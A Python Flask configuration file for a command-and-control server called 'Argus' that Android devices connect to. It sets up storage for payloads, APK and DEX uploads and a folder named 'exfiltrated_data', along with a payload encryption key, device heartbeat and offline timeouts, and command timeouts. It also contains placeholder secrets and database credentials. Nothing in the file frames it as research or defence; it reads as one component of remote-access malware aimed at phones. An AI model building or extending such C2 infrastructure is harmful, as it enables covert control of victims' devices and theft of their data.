"""
C2 System Configuration - Argus Project
"""

import os
from datetime import timedelta

class Config:
    """Base configuration"""
    
    # Flask Settings
    SECRET_KEY = os.environ.get('SECRET_KEY', 'argus_c2_secret_key_change_in_production_2024')
    
    # Database Settings
    BASE_DIR = os.path.abspath(os.path.dirname(__file__))
    DATABASE_URL = os.environ.get('DATABASE_URL', f'sqlite:///{os.path.join(BASE_DIR, "argus_c2.db")}')
    SQLALCHEMY_DATABASE_URI = DATABASE_URL
    SQLALCHEMY_TRACK_MODIFICATIONS = False
    SQLALCHEMY_ECHO = False
    
    # Upload Settings
    UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
    PAYLOAD_FOLDER = os.path.join(BASE_DIR, 'payloads')
    EXFILTRATED_DATA_FOLDER = os.path.join(BASE_DIR, 'exfiltrated_data')
    MAX_CONTENT_LENGTH = 100 * 1024 * 1024  # 100MB
    ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'dex', 'apk', 'txt', 'json', 'zip'}
    
    # Session Settings
    SESSION_TYPE = 'filesystem'
    PERMANENT_SESSION_LIFETIME = timedelta(hours=24)
    SESSION_COOKIE_SECURE = False  # True in production with HTTPS
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SAMESITE = 'Lax'
    
    # WebSocket Settings
    SOCKETIO_PING_TIMEOUT = 60
    SOCKETIO_PING_INTERVAL = 25
    
    # C2 Settings
    C2_SERVER_HOST = os.environ.get('C2_SERVER_HOST', '0.0.0.0')
    C2_SERVER_PORT = int(os.environ.get('C2_SERVER_PORT', 5000))
    C2_USE_SSL = os.environ.get('C2_USE_SSL', 'false').lower() == 'true'
    
    # Server URLs (for Android to connect)
    C2_PUBLIC_URL = os.environ.get('C2_PUBLIC_URL', f'http://localhost:{C2_SERVER_PORT}')
    C2_WEBSOCKET_URL = os.environ.get('C2_WEBSOCKET_URL', f'ws://localhost:{C2_SERVER_PORT}')
    
    # Device Settings
    DEVICE_TIMEOUT = 300  # 5 minutes - marks device as offline
    DEVICE_HEARTBEAT_INTERVAL = 60  # 1 minute
    COMMAND_TIMEOUT = 180  # 3 minutes
    
    # Payload Settings
    PAYLOAD_ENCRYPTION_KEY = os.environ.get('PAYLOAD_ENCRYPTION_KEY', 'argus_payload_encryption_2024')
    PAYLOAD_VERSION = '1.0.0'
    
    # Security Settings
    ENABLE_ENCRYPTION = True
    AES_KEY_SIZE = 256
    RSA_KEY_SIZE = 2048
    
    # Logging
    LOG_LEVEL = os.environ.get('LOG_LEVEL', 'INFO')
    LOG_FILE = os.path.join(BASE_DIR, 'logs', 'argus_c2.log')
    LOG_MAX_SIZE = 10 * 1024 * 1024  # 10MB
    LOG_BACKUP_COUNT = 5
    
    # Auto Cleanup
    AUTO_CLEANUP_ENABLED = True
    CLEANUP_OLD_DATA_DAYS = 30
    CLEANUP_INTERVAL_HOURS = 24
    
    # Rate Limiting
    RATELIMIT_ENABLED = True
    RATELIMIT_DEFAULT = "100 per hour"
    RATELIMIT_STORAGE_URL = "memory://"
    
    @staticmethod
    def init_app(app):
        """Initialize settings with the application"""
        # Create necessary directories
        os.makedirs(Config.UPLOAD_FOLDER, exist_ok=True)
        os.makedirs(Config.PAYLOAD_FOLDER, exist_ok=True)
        os.makedirs(Config.EXFILTRATED_DATA_FOLDER, exist_ok=True)
        os.makedirs(os.path.join(Config.BASE_DIR, 'logs'), exist_ok=True)


class DevelopmentConfig(Config):
    """Development configuration"""
    DEBUG = True
    TESTING = False
    SQLALCHEMY_ECHO = True
    
    # Development URLs
    C2_PUBLIC_URL = 'http://localhost:5000'
    C2_WEBSOCKET_URL = 'ws://localhost:5000'


class ProductionConfig(Config):
    """Production configuration"""
    DEBUG = False
    TESTING = False
    
    # Use environment variables in production
    SECRET_KEY = os.environ.get('SECRET_KEY') or os.urandom(32).hex()
    
    # SSL required
    SESSION_COOKIE_SECURE = True
    C2_USE_SSL = True
    
    # Production URLs (must be configured via environment variables)
    C2_PUBLIC_URL = os.environ.get('C2_PUBLIC_URL', 'https://your-server.com')
    C2_WEBSOCKET_URL = os.environ.get('C2_WEBSOCKET_URL', 'wss://your-server.com')
    
    # Production database
    DATABASE_URL = os.environ.get('DATABASE_URL', 'postgresql://user:password@localhost/argus_c2')
    SQLALCHEMY_DATABASE_URI = DATABASE_URL


class TestingConfig(Config):
    """Testing configuration"""
    TESTING = True
    DEBUG = True
    
    # In-memory database for testing
    SQLALCHEMY_DATABASE_URI = 'sqlite:///:memory:'
    
    # Disable CSRF for testing
    WTF_CSRF_ENABLED = False


# Configuration dictionary
config = {
    'development': DevelopmentConfig,
    'production': ProductionConfig,
    'testing': TestingConfig,
    'default': DevelopmentConfig
}


def get_config(config_name=None):
    """Returns configuration based on environment"""
    if config_name is None:
        config_name = os.environ.get('FLASK_ENV', 'development')
    
    return config.get(config_name, DevelopmentConfig)




